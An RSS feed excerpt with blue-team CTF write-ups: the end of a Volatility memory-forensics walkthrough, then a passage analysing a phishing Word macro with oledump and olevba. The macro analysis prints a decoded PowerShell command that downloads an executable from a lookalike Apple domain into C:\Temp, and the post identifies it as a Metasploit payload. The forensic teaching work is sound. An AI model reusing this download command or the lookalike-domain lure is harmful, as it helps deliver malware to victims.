&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist --pid 6988 --dump &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Volatility 3 Framework 2.2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Progress:  100.00               PDB scanning finished&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6988    4352    OneDrive.exe    0xbf0f6d4262c0  26      -       1       True    2021-04-30 17:40:01     N/A     pid.6988.0x1c0000.dmp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Now it’s time to use  &lt;code&gt;md5sum&lt;/code&gt;  to get the md5 hash of the executable!&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;md5sum&lt;/span&gt; pid.6988.0x1c0000.dmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0b493d8e26f03ccd2060e0be85f430af  pid.6988.0x1c0000.dmp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 0b493d8e26f03ccd2060e0be85f430af&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;7- What is the word starting at offset 0x45BE876 with a length of 6 bytes?&lt;br&gt;
OK we need to know the word at offset 0x45BE876! we can do it using  &lt;code&gt;xxd&lt;/code&gt;  just we start from this offest and stop after 6 bytes! to specify the offset that you want to start from it just use  &lt;code&gt;-s&lt;/code&gt;  options and to specify the length to display use  &lt;code&gt;-l&lt;/code&gt;  option&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;xxd -g1 --s 0x45be876 -l 6 20210430-Win10Home-20H2-64bit-memdump.mem &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;045be876: 68 61 63 6b 65 72                                hacker&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: hacker&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;8- What is the creation date and time of the parent process of “powershell.exe”? (YYYY-MM-DD HH:MM:SS)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We need to know the parent process of powershell! we can do it using  &lt;code&gt;pslist&lt;/code&gt;  and check the  &lt;code&gt;PPID&lt;/code&gt; . But I’ll go with  &lt;code&gt;pstree&lt;/code&gt;  plugin! it will make it easier for me. I don’t want to waste my time searching at the parent process using PPID !&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pstree |  grep -i powershell -B 4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 564   668     LogonUI.exe     0xbf0f6b7b7100  0       -       1       False   2021-04-30 12:39:44      2021-04-30 17:39:58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 4296  668     userinit.exe    0xbf0f6ca8f080  0       -       1       False   2021-04-30 17:39:48      2021-04-30 17:40:12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;** 4352 4296    explorer.exe    0xbf0f6ca662c0  82      -       1       False   2021-04-30 17:39:48      N/A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*** 6884        4352    VBoxTray.exe    0xbf0f6d186080  11      -       1       False   2021-04-30 17:40:01      N/A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*** 5096        4352    powershell.exe  0xbf0f6d97f2c0  12      -       1       False   2021-04-30 17:51:19      N/A&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 2021-04-30 17:39:48&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;9- What is the full path and name of the last file opened in notepad?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Notepad is an executable that use the file as an argument ! so  &lt;code&gt;cmdline&lt;/code&gt;  plugin will help us the get the files opened with notepad !&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.cmdline | grep -i notepad   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2520 notepad.exe     &lt;span class=&#34;string&#34;&gt;&amp;quot;C:\Windows\system32\NOTEPAD.EXE&amp;quot;&lt;/span&gt; C:\Users\JOHNDO~1\AppData\Local\Temp\7zO4FB31F24\accountNum&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  C:\Users\JOHNDO~1\AppData\Local\Temp\7zO4FB31F24\accountNum&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;10- How long did the suspect use Brave browser? (hh:mm:ss)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let me tell you something! When we speak about more details about system apps nothing will be usefull more than the windows registries! One of the most important registries is  &lt;code&gt;UserAssist&lt;/code&gt; &lt;br&gt;
The  &lt;code&gt;UserAssist&lt;/code&gt;  key, a part of Microsoft Windows registry, records the information related to programs run by a user on a Windows system&lt;/p&gt;
&lt;p&gt;Volatility is powerful! we can use the  &lt;code&gt;userassist&lt;/code&gt;  plugin to get what we want!&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.registry.userassist | grep -i brave &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 0xa80333cda0000       \??\C:\Users\John Doe\ntuser.dat        ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\&amp;#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&amp;#125;\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\BraveSoftware\Temp\GUM20E0.tmp\BraveUpdate.exe N/A      0       0       0:00:03  N/A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 0xa80333cda000        \??\C:\Users\John Doe\ntuser.dat        ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\&amp;#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&amp;#125;\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\BraveSoftware\Update\BraveUpdate.exe     N/A   0:00:24.797000   N/A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 0xa80333cda000        \??\C:\Users\John Doe\ntuser.dat        ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\&amp;#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&amp;#125;\Count  2021-04-30 17:52:18      Value   Brave   N/A     9       22      4:01:54  2021-04-30 17:48:45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 0xa80333cda000        \??\C:\Users\John Doe\ntuser.dat        ntuser.dat\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\&amp;#123;F4E57C4B-2036-45F0-A9AB-443BCFE33D9F&amp;#125;\Count  2021-04-30 17:51:18      Value   C:\Users\Public\Desktop\Brave.lnk       N/A     8       0     0:00:00.508000   2021-04-30 17:48:45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  04:01:54&lt;/p&gt;
&lt;/div&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/09/05/CyberDefenders/Phishy/</guid>
            <title>CyberDefenders Writeup  Phishy</title>
            <link>http://example.com/2022/09/05/CyberDefenders/Phishy/</link>
            <pubDate>Mon, 05 Sep 2022 16:46:09 +0100</pubDate>
            <description><![CDATA[ &lt;p&gt;This CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.&lt;br&gt;
The maldoc download a malware in our victim personal computer! Let’s figure out what is going on!&lt;/p&gt;
&lt;h1 id=&#34;challenge-information&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#challenge-information&#34;&gt;#&lt;/a&gt; Challenge Information&lt;/h1&gt;
&lt;details class=&#34;info&#34;&gt;&lt;summary&gt;Description&lt;/summary&gt;&lt;div&gt;
&lt;p&gt;A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee’s system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.&lt;/p&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;p&gt;Challenge Link &amp;amp; Author&lt;/p&gt;
&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;Challenge Link&#34; style=&#34;--block-color:#2296fd;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=&#34; data-background-image=&#34;https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=&#34;&gt;Challenge Link&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;CyberDefenders - Phishy&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;Author - SemahBA&#34; style=&#34;--block-color:#de2336;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==&#34; data-background-image=&#34;https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==&#34;&gt;Author - SemahBA&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;SemahBA Twitter Profile&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;walkthrough&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#walkthrough&#34;&gt;#&lt;/a&gt; Walkthrough&lt;/h1&gt;
&lt;p&gt;I use WSL, FTK imager and Registry Explorer&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1- What is the hostname of the victim machine?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.imgur.com/UlU40CE.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
Let’s check  &lt;code&gt;SYSTEM\ControlSet001\Control\ComputerName\ComputerName&lt;/code&gt;  registry key&lt;br&gt;
&lt;img data-src=&#34;https://i.imgur.com/bUMRhhs.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Answer:  WIN-NF3JQEU4G0T&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2- What is the messaging app installed on the victim machine?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.imgur.com/vE2xpqz.png&#34; alt=&#34;WhatsApp&#34;&gt;&lt;br&gt;
Answser: WhatsApp&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;3- The attacker tricked the victim into downloading a malicious document. Provide the full download URL.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;WhatsApp has a database that stores the messages and discussion. Let’s check  &lt;code&gt;\Users\Semah\AppData\Roaming\WhatsApp&lt;/code&gt; .We find a folder called  &lt;code&gt;Databases&lt;/code&gt;  that contains a  &lt;code&gt;db&lt;/code&gt;  that can be opened using  &lt;code&gt;DB Browser for SQLite&lt;/code&gt; . The messages are stored in  &lt;code&gt;msgstore.db&lt;/code&gt; &lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/SFlAYTD.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
We can open this db file using  &lt;code&gt;DB Browser&lt;/code&gt;  and check the  &lt;code&gt;legacy_available_messages_view&lt;/code&gt;  table and we will a discussion about IPhone 12 special edition giveaway&lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/EGZVAxH.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
Answer:  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FwcEllLmNvbS9JUGhvbmUtV2lubmVycy5kb2M=&#34;&gt;http://appIe.com/IPhone-Winners.doc&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;4- Multiple streams contain macros in the document. Provide the number of the highest stream.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The victim download the word document file. You can find it on  &lt;code&gt;Semah\Downloads&lt;/code&gt;  folder&lt;br&gt;
Let’s export it from FTK imager and use  &lt;code&gt;oledump&lt;/code&gt;  to check the streams in the document&lt;br&gt;
We find  &lt;code&gt;Macros/VBA/iphoneevil&lt;/code&gt;  the highest stream&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Raf²@4n6nk8s:~$ oledump IPhone-Winners.doc                                                                                       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  1:       114 &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x01CompObj&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  2:      4096 &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x05DocumentSummaryInformation&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  3:      4096 &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x05SummaryInformation&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  4:      8473 &lt;span class=&#34;string&#34;&gt;&amp;#x27;1Table&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  5:       501 &lt;span class=&#34;string&#34;&gt;&amp;#x27;Macros/PROJECT&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  6:        68 &lt;span class=&#34;string&#34;&gt;&amp;#x27;Macros/PROJECTwm&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  7:      3109 &lt;span class=&#34;string&#34;&gt;&amp;#x27;Macros/VBA/_VBA_PROJECT&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  8:       800 &lt;span class=&#34;string&#34;&gt;&amp;#x27;Macros/VBA/dir&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  9: M    1170 &lt;span class=&#34;string&#34;&gt;&amp;#x27;Macros/VBA/eviliphone&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 10: M    5581 &lt;span class=&#34;string&#34;&gt;&amp;#x27;Macros/VBA/iphoneevil&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Answer: 10&lt;/p&gt;
&lt;p&gt;Let’s do some analysis on the macro and the malicious document using the  &lt;code&gt;oletools&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Raf²@4n6nk8s:~$ olevba IPhone-Winners.doc --deobf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;olevba IPhone-Winners.doc --deobf                                                                                 ─╯&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;XLMMacroDeobfuscator: pywin32 is not installed (only is required &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; you want to use MS Excel)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;olevba 0.60.1 on Python 3.10.4 - http://decalage.info/python/oletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;===============================================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FILE: IPhone-Winners.doc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Type: OLE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-------------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VBA MACRO eviliphone.cls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; file: IPhone-Winners.doc - OLE stream: &lt;span class=&#34;string&#34;&gt;&amp;#x27;Macros/VBA/eviliphone&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Scrolling a bit and we find a VBA string variable from the macro that contain base64 cipher, the macro try to execute the decoded&lt;br&gt;
ٍ&lt;img data-src=&#34;https://imgur.com/bvrf9oR.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
OK let’s decode it and check what the attacker want to do !&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;raf²@4n6nk8s:~$ &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;string&#34;&gt;&amp;quot;aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA&amp;quot;&lt;/span&gt; | &lt;span class=&#34;built_in&#34;&gt;base64&lt;/span&gt; -d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;invoke-webrequest -Uri &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://appIe.com/Iphone.exe&amp;#x27;&lt;/span&gt; -OutFile &lt;span class=&#34;string&#34;&gt;&amp;#x27;C:\Temp\IPhone.exe&amp;#x27;&lt;/span&gt; -UseDefaultCredentials&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Wow! The macro try to run an obfuscated  &lt;code&gt;powershell&lt;/code&gt;  command that download an executable from  &lt;code&gt;http://appIe.com/Iphone.exe&lt;/code&gt;  and save it as   &lt;code&gt;C:\Temp\IPhone.exe&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;5- The macro executed a program. Provide the program name?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Answer: Powershell&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;6- The macro downloaded a malicious file. Provide the full download URL.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Answer: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FwcEllLmNvbS9JcGhvbmUuZXhl&#34;&gt;http://appIe.com/Iphone.exe&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;7- Where was the malicious file downloaded to? (Provide the full path)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Answer:  C:\Temp\IPhone.exe&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;8- What is the name of the framework used to create the malware?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I am sure that Metasploit is the framework. But let’s make it like we get the points without guessing the answer! OK dude upload the malicious file downloaded to our love  &lt;code&gt;virustotal&lt;/code&gt; &lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/BKPJ37M.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Just google  &lt;code&gt;Meterpreter&lt;/code&gt;  and you’ll find that Meterpreter is a Metasploit attack payload that provides an interactive shell&lt;/p&gt;
&lt;p&gt;Ok dude don’t search ! go to  &lt;code&gt;COMMUNITY&lt;/code&gt;  tab in  &lt;code&gt;virustotal&lt;/code&gt;  and you’ll find comments. You’ll find a metasploit payload detected !&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/xuOEWiC.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Answer: Metasploit&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;9- What is the attacker’s IP address?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;OK! Now we know that the malicious document download a binary! Of course this binary is a malware.&lt;br&gt;
We need to know what is the attacker’s IP address. So let’s do some dynamic analysis. We can do it using either  &lt;code&gt;any.run&lt;/code&gt;  or  &lt;code&gt;hybrid-analysis&lt;/code&gt; . I will use it both of them just for fun !! Just upload the binary  &lt;code&gt;IPhone.exe&lt;/code&gt;  and check the connections !&lt;/p&gt;
&lt;p&gt;ٍ&lt;img data-src=&#34;https://imgur.com/w04BlMl.png&#34; alt=&#34;&#34; title=&#34;Using app.run.any&#34;&gt;&lt;br&gt;
